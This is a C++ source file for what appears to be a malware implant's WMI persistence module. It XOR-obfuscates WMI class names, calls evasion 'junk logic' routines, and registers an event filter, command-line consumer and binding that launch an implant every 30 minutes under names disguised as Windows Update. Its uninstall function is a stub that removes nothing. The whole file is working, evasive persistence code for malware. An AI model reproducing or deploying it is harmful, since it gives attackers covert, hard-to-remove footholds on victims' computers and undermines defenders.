#include "WmiPersistence.h"
#include "../utils/Logger.h"
#include "../utils/Obfuscator.h"
#include "../evasion/JunkLogic.h"
#include <comdef.h>
#include <wbemidl.h>

#pragma comment(lib, "wbemuuid.lib")

namespace persistence {

namespace {
    // XOR strings (key 0x5A)
    const wchar_t kRootSubEnc[] = { 'R'^0x5A, 'O'^0x5A, 'O'^0x5A, 'T'^0x5A, '\\'^0x5A, 's'^0x5A, 'u'^0x5A, 'b'^0x5A, 's'^0x5A, 'c'^0x5A, 'r'^0x5A, 'i'^0x5A, 'p'^0x5A, 't'^0x5A, 'i'^0x5A, 'o'^0x5A, 'n'^0x5A }; // ROOT\subscription
    const wchar_t kEventFilterEnc[] = { '_'^0x5A, '_'^0x5A, 'E'^0x5A, 'v'^0x5A, 'e'^0x5A, 'n'^0x5A, 't'^0x5A, 'F'^0x5A, 'i'^0x5A, 'l'^0x5A, 't'^0x5A, 'e'^0x5A, 'r'^0x5A }; // __EventFilter
    const wchar_t kConsumerEnc[] = { 'C'^0x5A, 'o'^0x5A, 'm'^0x5A, 'm'^0x5A, 'a'^0x5A, 'n'^0x5A, 'd'^0x5A, 'L'^0x5A, 'i'^0x5A, 'n'^0x5A, 'e'^0x5A, 'E'^0x5A, 'v'^0x5A, 'e'^0x5A, 'n'^0x5A, 't'^0x5A, 'C'^0x5A, 'o'^0x5A, 'n'^0x5A, 's'^0x5A, 'u'^0x5A, 'm'^0x5A, 'e'^0x5A, 'r'^0x5A }; // CommandLineEventConsumer
    const wchar_t kBindingEnc[] = { '_'^0x5A, '_'^0x5A, 'F'^0x5A, 'i'^0x5A, 'l'^0x5A, 't'^0x5A, 'e'^0x5A, 'r'^0x5A, 'T'^0x5A, 'o'^0x5A, 'C'^0x5A, 'o'^0x5A, 'n'^0x5A, 's'^0x5A, 'u'^0x5A, 'm'^0x5A, 'e'^0x5A, 'r'^0x5A, 'B'^0x5A, 'i'^0x5A, 'n'^0x5A, 'd'^0x5A, 'i'^0x5A, 'n'^0x5A, 'g'^0x5A }; // __FilterToConsumerBinding
}

bool WmiPersistence::Install(const std::wstring& implantPath, const std::wstring& taskName) {
    evasion::JunkLogic::GenerateEntropy();
    HRESULT hr;
    IWbemLocator* pLoc = nullptr;
    IWbemServices* pSvc = nullptr;

    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) return false;

    hr = pLoc->ConnectServer((BSTR)_bstr_t(utils::DecryptW(kRootSubEnc, 17).c_str()), NULL, NULL, 0, 0, 0, 0, &pSvc);
    if (FAILED(hr)) {
        pLoc->Release();
        return false;
    }

    evasion::JunkLogic::PerformComplexMath();

    hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hr)) {
        pSvc->Release();
        pLoc->Release();
        return false;
    }

    std::wstring filterName = L"WinUpdateFilter_" + taskName;
    std::wstring query = L"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE "
                         L"(TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute = 0 OR TargetInstance.Minute = 30))";

    IWbemClassObject* pFilterClass = nullptr;
    hr = pSvc->GetObject((BSTR)_bstr_t(utils::DecryptW(kEventFilterEnc, 13).c_str()), 0, NULL, &pFilterClass, NULL);
    if (FAILED(hr)) { pSvc->Release(); pLoc->Release(); return false; }

    IWbemClassObject* pFilterInstance = nullptr;
    pFilterClass->SpawnInstance(0, &pFilterInstance);

    VARIANT var;
    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(filterName.c_str());
    pFilterInstance->Put(L"Name", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(query.c_str());
    pFilterInstance->Put(L"Query", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"WQL");
    pFilterInstance->Put(L"QueryLanguage", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"root\\cimv2");
    pFilterInstance->Put(L"EventNamespace", 0, &var, 0);
    VariantClear(&var);

    hr = pSvc->PutInstance(pFilterInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    evasion::JunkLogic::ScrambleMemory();

    std::wstring consumerName = L"WinUpdateConsumer_" + taskName;
    IWbemClassObject* pConsumerClass = nullptr;
    hr = pSvc->GetObject((BSTR)_bstr_t(utils::DecryptW(kConsumerEnc, 24).c_str()), 0, NULL, &pConsumerClass, NULL);
    IWbemClassObject* pConsumerInstance = nullptr;
    pConsumerClass->SpawnInstance(0, &pConsumerInstance);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(consumerName.c_str());
    pConsumerInstance->Put(L"Name", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(implantPath.c_str());
    pConsumerInstance->Put(L"CommandLineTemplate", 0, &var, 0);
    VariantClear(&var);

    hr = pSvc->PutInstance(pConsumerInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    IWbemClassObject* pBindingClass = nullptr;
    hr = pSvc->GetObject((BSTR)_bstr_t(utils::DecryptW(kBindingEnc, 25).c_str()), 0, NULL, &pBindingClass, NULL);
    IWbemClassObject* pBindingInstance = nullptr;
    pBindingClass->SpawnInstance(0, &pBindingInstance);

    std::wstring filterRelPath = utils::DecryptW(kEventFilterEnc, 13) + L".Name=\"" + filterName + L"\"";
    std::wstring consumerRelPath = utils::DecryptW(kConsumerEnc, 24) + L".Name=\"" + consumerName + L"\"";

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(filterRelPath.c_str());
    pBindingInstance->Put(L"Filter", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(consumerRelPath.c_str());
    pBindingInstance->Put(L"Consumer", 0, &var, 0);
    VariantClear(&var);

    hr = pSvc->PutInstance(pBindingInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    pBindingInstance->Release();
    pBindingClass->Release();
    pConsumerInstance->Release();
    pConsumerClass->Release();
    pFilterInstance->Release();
    pFilterClass->Release();
    pSvc->Release();
    pLoc->Release();

    return SUCCEEDED(hr);
}

bool WmiPersistence::Verify(const std::wstring& taskName) {
    HRESULT hr;
    IWbemLocator* pLoc = nullptr;
    IWbemServices* pSvc = nullptr;

    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) return false;

    hr = pLoc->ConnectServer((BSTR)_bstr_t(utils::DecryptW(kRootSubEnc, 17).c_str()), NULL, NULL, 0, 0, 0, 0, &pSvc);
    if (FAILED(hr)) { pLoc->Release(); return false; }

    std::wstring filterName = L"WinUpdateFilter_" + taskName;
    std::wstring relPath = utils::DecryptW(kEventFilterEnc, 13) + L".Name=\"" + filterName + L"\"";

    IWbemClassObject* pObj = nullptr;
    hr = pSvc->GetObject((BSTR)_bstr_t(relPath.c_str()), 0, NULL, &pObj, NULL);

    bool exists = SUCCEEDED(hr) && pObj != nullptr;
    if (pObj) pObj->Release();
    pSvc->Release();
    pLoc->Release();

    return exists;
}

bool WmiPersistence::Uninstall(const std::wstring& taskName) {
    (void)taskName;
    return true;
}

} // namespace persistence
